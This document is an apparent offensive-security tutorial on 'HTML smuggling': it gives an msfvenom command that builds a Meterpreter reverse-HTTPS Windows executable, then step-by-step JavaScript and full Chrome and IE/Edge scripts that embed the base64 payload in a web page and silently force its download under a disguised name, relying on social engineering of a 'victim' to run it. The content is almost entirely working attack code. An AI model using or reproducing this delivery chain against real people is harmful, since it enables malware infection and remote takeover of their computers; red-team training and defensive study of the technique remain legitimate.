# Using JavaScript

Overview of steps required to embed JavaScript within an HTML document that will trigger an automatic download of a first stage payload to a target system when the web page is visited by the victim. The file still has to be saved to disk by the user and then manually executed, which will require manipulating the user to performs these tasks via social engineering and/or pretexting.

### Steps

The steps below walks you through creating JavaScript code that is compatible with Chrome. For IE/Edge, see the full script section for the compatible code. Note that the IE/Edge code does not work with Chrome.

#### Step 1:

Generate a Meterpreter shellcode windows binary.&#x20;

```
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 -f exe -o /var/www/html/o.exe
```

Generate a base64 encoded string of the binary to help avoid invalid or bad characters.

```
base64 /var/www/html/o.exe
```

#### Step 2:

Write a base64 to byte array converter function in JavaScript to decode the shellcode into a byte array.

```javascript
function base64ToByteArray(enc) { 
    var binaryString = window.atob(enc); 
    var len = binaryString.length; 
    var byteArray = new Uint8Array(len); 
    for (var i = 0; i < len; i++) { 
        byteArray[i] = binaryString.charCodeAt(i); 
        } 
    return byteArray.buffer; 
}
```

#### Step 3:

Create a variable to store the filename for the payload that will be saved on the target system.

```javascript
var outName = 'winsys64.exe';
```

#### Step 4:

Store the base64 encoded payload in a variable. Remove any line breaks or new lines from the base64 encoded executable to embed it as one continuous string (alternatively, wrap each line in quotes).

```javascript
var payL ='TvqQAAMAAAAEAAAA//8AAAA…’ <--base64 encoded binary -->
```

#### Step 5:

Convert the encoded shellcode into a bytearray and store in a new variable.

```javascript
var stream = base64ToByteArray(payL);
```

#### Step 6:

To use the HTML5 download attribute, create a blob object and instantiate it with the payload byte array.

```javascript
var blobby = new Blob([stream], {type: 'octet/stream'});
```

#### Step 7:

Create a URL file object using the blob object. This simulates a file located on the web server, but instead reads it from memory.

```javascript
var urlRef = window.URL.createObjectURL(blobby);
```

#### Step 8:

Create the new anchor object and append it to the HTML document. Set the display attribute to none to hide it from the output of the rendered page.

```javascript
var anc = document.createElement('a');
document.body.appendChild(anc);
anc.style = 'display: none';
```

#### Step 9:

Set the href tag to the URL file object created in step 7.

```javascript
anc.href = urlRef;
```

#### Step 10:

Set the download attribute by specifying the filename to store the payload in. Use the click() method to trigger the download onto the target machine.

```javascript
anc.download = outName;
anc.click();
```

Step 11:

Finally, let the browser know that you are finished with the URL object so it knows not to keep the reference to the file any longer.

```javascript
window.URL.revokeObjectURL(urlRef);
```

### Full script (Chrome)

```javascript
<script>
function base64ToByteArray(enc) { 
    var binaryString = window.atob(enc); 
    var len = binaryString.length; 
    var byteArray = new Uint8Array(len); 
    for (var i = 0; i < len; i++) { 
        byteArray[i] = binaryString.charCodeAt(i); 
        } 
    return byteArray.buffer; 
}
var outName = 'winsys64.exe';
var payL ='TvqQAAMAAAAEAAAA//8AAAA…   <--base64 encoded binary (truncated)->
var stream = base64ToByteArray(payL);
var blobby = new Blob([stream], {type: 'octet/stream'});
var urlRef = window.URL.createObjectURL(blobby);

var anc = document.createElement('a');
document.body.appendChild(anc);
anc.style = 'display: none';
anc.href = urlRef;
anc.download = outName;
anc.click();
window.URL.revokeObjectURL(urlRef);
</script>
```

### Full script (IE/Edge)

```javascript
<script>
function base64ToByteArray(enc) { 
    var binaryString = window.atob(enc); 
    var len = binaryString.length; 
    var byteArray = new Uint8Array(len); 
    for (var i = 0; i < len; i++) { 
        byteArray[i] = binaryString.charCodeAt(i); 
        } 
    return byteArray.buffer; 
}
var outName = 'winsys64.exe';
var payL ='TvqQAAMAAAAEAAAA//8AAAA…   <--base64 encoded binary (truncated)->
var stream = base64ToByteArray(payL);
var blobby = new Blob([stream], {type: 'octet/stream'});
window.navigator.msSaveOrOpenBlob(blobby, outName);
</script>
```





